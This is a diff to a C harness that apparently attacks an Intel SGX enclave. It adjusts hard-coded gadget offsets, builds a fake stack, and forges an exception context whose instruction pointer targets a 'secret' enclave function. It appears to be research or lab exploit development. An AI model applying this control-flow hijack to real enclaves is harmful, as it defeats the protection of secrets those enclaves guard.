@@ -259,8 +259,8 @@ int SGX_CDECL main(int argc, char *argv[])
 
     printf("Give me the base address: ");
     unsigned long enclaveBaseAddr;
-    unsigned long asmOretPos = 0x8c37;
-    unsigned long continueExecutionPos =  0x8d0e;
+    unsigned long asmOretPos = 0x8c27;
+    unsigned long continueExecutionPos =  0x8cfe;
     unsigned long secretPos = 0x4240;
     char buf[11];
     
@@ -284,32 +284,39 @@ int SGX_CDECL main(int argc, char *argv[])
     printf("fakeStack: %lx\n", fakeStack);
 
     /* Create Fake Stack Frame */
+    for(int i = 0; i < 100; i++){
+        fakeStack[i] = i;
+    }
+    fakeStack[0] = 0x0000111100002222;
+    fakeStack[1] = 0x1234123412341234;
+    fakeStack[2] = 0x00000000004014ee;
+    fakeStack[4] = 0x1557155715571557;
     
-
     /* Exception Context */
     sgx_exception_info_t ctx;
     // /* Test */
-    // // ctx.cpu_context.rax = 1557;
-    // ctx.cpu_context.rcx = 1556;
-    // ctx.cpu_context.rdx = 1557;
-    // ctx.cpu_context.rbx = 1558;
-    // // ctx.cpu_context.rsp = 1559;
-    // ctx.cpu_context.rbp = 1560;
-    // ctx.cpu_context.rdi = 1561;
-    // ctx.cpu_context.r8 = 1562;
-    // ctx.cpu_context.r9 = 1563;
-    // ctx.cpu_context.r10 = 1564;
-    // ctx.cpu_context.r11 = 1565;
-    // ctx.cpu_context.r12 = 1566;
-    // ctx.cpu_context.r13 = 1567;
-    // ctx.cpu_context.r14 = 1568;
-    // ctx.cpu_context.r15 = 1569;
-    // ctx.cpu_context.rflags = 1570;
-    // ctx.cpu_context.rip = 1571;
+    // ctx.cpu_context.rax = 1557;
+    ctx.cpu_context.rcx = 1556;
+    ctx.cpu_context.rdx = 1557;
+    ctx.cpu_context.rbx = 1558;
+    // ctx.cpu_context.rsp = 1559;
+    ctx.cpu_context.rbp = 1560;
+    ctx.cpu_context.rdi = 1561;
+    ctx.cpu_context.r8 = 1562;
+    ctx.cpu_context.r9 = 1563;
+    ctx.cpu_context.r10 = 1564;
+    ctx.cpu_context.r11 = 1565;
+    ctx.cpu_context.r12 = 1566;
+    ctx.cpu_context.r13 = 1567;
+    ctx.cpu_context.r14 = 1568;
+    ctx.cpu_context.r15 = 1569;
+    ctx.cpu_context.rflags = 1570;
+    ctx.cpu_context.rip = 1571;
 
     // ctx.cpu_context.rdi = 
     ctx.cpu_context.rdx = sizeof(fakeStack);
     ctx.cpu_context.rsi = (unsigned long)fakeStack;
+    ctx.cpu_context.rsp = (unsigned long)fakeStack+16;
     ctx.cpu_context.rip = secret;
     
     
